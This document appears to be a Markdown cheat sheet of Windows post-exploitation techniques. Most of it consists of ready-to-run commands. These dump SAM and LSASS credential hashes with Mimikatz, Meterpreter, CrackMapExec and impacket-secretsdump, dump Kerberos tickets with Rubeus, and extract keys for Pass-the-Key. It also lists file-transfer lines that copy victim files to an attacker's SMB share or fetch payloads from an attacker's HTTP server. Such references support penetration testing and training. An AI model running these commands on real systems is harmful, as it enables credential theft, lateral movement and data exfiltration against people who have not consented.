---
title: Windows privilege escalation
---

- [1. Extracting NT hash](#1-extracting-nt-hash)
  - [1.1. From local SAM](#11-from-local-sam)
    - [1.1.1. Mimiktaz](#111-mimiktaz)
    - [1.1.2. SAM dumping and offline hashes extraction](#112-sam-dumping-and-offline-hashes-extraction)
  - [1.2. From LSASS memory](#12-from-lsass-memory)
- [2. Extracting Kerberos TGT](#2-extracting-kerberos-tgt)
- [3. Extracting Kerberos user's key](#3-extracting-kerberos-users-key)
- [4. File transfer](#4-file-transfer)
  - [4.1. SMB (two ways)](#41-smb-two-ways)
  - [4.2. Evil-WinRM (two ways)](#42-evil-winrm-two-ways)
  - [4.3. HTTP (attacker -\> victim)](#43-http-attacker---victim)

## 1. Extracting NT hash

### 1.1. From local SAM
SAM (Security Account Manager) is a database with all the **local user** accounts and passwords. It acts as a database. Passwords, which are stored in the SAM, are hashed. SAM data is used by LSASS to verify user credentials.

#### 1.1.1. Mimiktaz
Mimikatz is one of the tools that are able to dump SAM file hashes.

```powershell
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

Metasploit, when the session is already established, has built-in ability to dump SAM hashes.

```bash
# Meterpreter
meterpreter > hashdump
```

CrackMapExec tool is able to remotely dump SAM hashes (via SMB using credentials).

```bash
crackmapexec smb <target-ip> -u <username> -p <password> --sam
```

#### 1.1.2. SAM dumping and offline hashes extraction
If an attacker has privileges to access any file in the system, then he can export SAM and SYSTEM keys from the Windows registry and perform the extraction of hashes offline.

```powershell
# Dump SYSTEM hashes
reg save hklm\system <dump-file>

# Dump SAM hashes
reg save hklm\sam <dump-file>
```

Now, transfer files to the attacker machine.

```bash
# Dump hashes offline
impacket-secretsdump -sam <sam-file> -system <system-file> LOCAL 
```

### 1.2. From LSASS memory
LSASS (_Local Security Authority Subsystem Service_) is a process running on every Windows OS. It verifies users logging, handles password changes, creates access tokens, writes to the Windows Security Log. In a domain environment LSASS communicates with a Domain Controller. It manages NTLM, Kerberos, NetLogon authentication. It's not possible to use Windows without `lsass.exe` running. An attacker is able to dump the LSASS process memory and retrieve NT hashes.

Tips:

- Memory dump must be performed after logging in successfully. Correct data must be provided to LSASS process before extraction.
- Memory dump should be performed from SYSTEM or local Administrator account.
- Not secured LSASS memory dump can be performed using built-in Windows tools (e.g. [dump.exe](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dump64/)). Then credentials can be extracted offline.

LSASS process might have additional security layer called _LSA protection_. It can be omitted with tools like **Mimikatz**.

```powershell
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "exit"
```

## 2. Extracting Kerberos TGT
Kerberos tickets can be extracted from LSASS memory (Kerberos harvesting) using `mimikatz` or `rubeus` tool. Most often it requires administrator privileges.

```powershell
# Show all Kerberos tickets stored in memory (and associated services)
Rubeus.exe triage

# Dump Kerberos tickets of :user
Rubeus.exe dump /user:<user>

# Dump Kerberos tickets of :service
Rubeus.exe dump /service:<service>
```

## 3. Extracting Kerberos user's key
It's done to perform Pass-the-Key attack.

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```

## 4. File transfer

[Great post about Windows file transfers for hackers](https://juggernaut-sec.com/windows-file-transfers-for-hackers/).

### 4.1. SMB (two ways)
Using local SMB server (running on the attacker's OS) an attacker is able transfer files in both ways:

```bash
# Run SMB server
impacket-smbserver -smb2support -username <username> -password <password> <share-name> <share-path>
```

```powershell
# Transfer file from the victim to the attacker
copy <local-file> \\<attacker-ip>\<share>\

# Transfer file from the attacker to the victim
copy \\<attacker-ip>\<share>\<file> <local-path>
```

### 4.2. Evil-WinRM (two ways)
The `evil-winrm` tool is able to perform file transfer out of the box if only session is established.

```bash
> download <file>
> send <file>
```

### 4.3. HTTP (attacker -> victim)
Attacker:

```bash
python -m http.server <PORT>
```

Victim:

```powershell
wget http://<ATTACKER_IP>:<PORT>/file.exe -O file.exe
# Or
Invoke-WebRequest -URI <URL> -OutFile <FILE>
```
